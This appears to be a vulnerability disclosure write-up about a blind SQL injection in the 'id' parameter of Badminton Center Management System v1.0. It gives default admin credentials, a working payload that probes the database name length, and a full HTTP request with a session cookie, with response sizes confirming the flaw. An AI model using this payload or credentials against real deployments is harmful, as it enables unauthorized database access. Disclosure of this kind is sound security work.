# Badminton Center Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15318/badminton-center-management-system-phpoop-free-source-code.html

Current database name: bcms_db,length is 7

Vulnerability File: /bcms/admin/?page=sales/view_details&id=

Vulnerability location: /bcms/admin/?page=sales/view_details&id=, id

[+] Payload: /bcms/admin/?page=sales/view_details&id=6%27%20and%20length(database())%20=7--+ // Leak place ---> id


```sql
GET /bcms/admin/?page=sales/view_details&id=6%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

When length (database ()) = 6, Content-Length: 28921
![image](https://user-images.githubusercontent.com/54017627/170617460-6218abeb-1c06-4b19-9af9-fe0cbcdad07b.png)

![image](https://user-images.githubusercontent.com/54017627/170617350-95b68b70-c9c6-4e5a-b415-8a437e14b685.png)

When length (database ()) = 7, Content-Length: 29893
![image](https://user-images.githubusercontent.com/54017627/170617379-ceebe8e8-24fc-471e-b14f-6ebfcc7aba36.png)

![image](https://user-images.githubusercontent.com/54017627/170617325-765fc518-4a61-4f27-9b15-77e657765032.png)
